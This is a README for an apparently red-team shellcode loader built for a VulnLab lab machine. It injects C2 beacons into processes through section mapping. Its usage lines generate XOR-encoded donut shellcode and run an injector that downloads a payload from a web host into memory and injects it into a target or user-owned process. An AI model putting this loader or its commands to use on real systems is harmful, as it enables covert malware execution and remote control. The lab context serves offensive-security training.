# ShivaLoader
Shellcode loader that I created to use for VulnLab's Shiva. Uses Section Mapping Injection.
I created this loader specifically to spawn Sliver or Adaptix beacons. It doesn't catch the resolution of the payload and transfer it back, it's a fire-and-forget kind of loader.

If you're curious about what it does and why you can check my blog: https://p0142.github.io/posts/shivainjector/

The donut generator requires donut shellcode: https://github.com/TheWover/donut
```
pip install donut-shellcode
```
It should work with any shellcode though, not only donut.

## Usage:
Create your payload
```sh
python donutGenerator.py -i DOUBTFUL_MANTEL.exe -x "Hello World"
```
Host the payload file on a web server and use the loader to download into memory and execute.
```powershell
.\ShivaInjector.exe /p:http://example.com/payload.bin /x:"Hello World" /pid:415
```
If `/pid` is included it will attempt to inject into the chosen PID. If not, it will automatically scan through processes for those owned by the user being run as. Then it will inject into one of the results instead.
```powershell
.\ShivaInjector.exe /p:http://example.com/payload.bin /x:"Hello World"
```
Omit -x or /x: if not using XOR functionality.

### References:
- https://oblivion-malware.xyz/
- https://maldevacademy.com/
- https://research.checkpoint.com/2025/waiting-thread-hijacking/
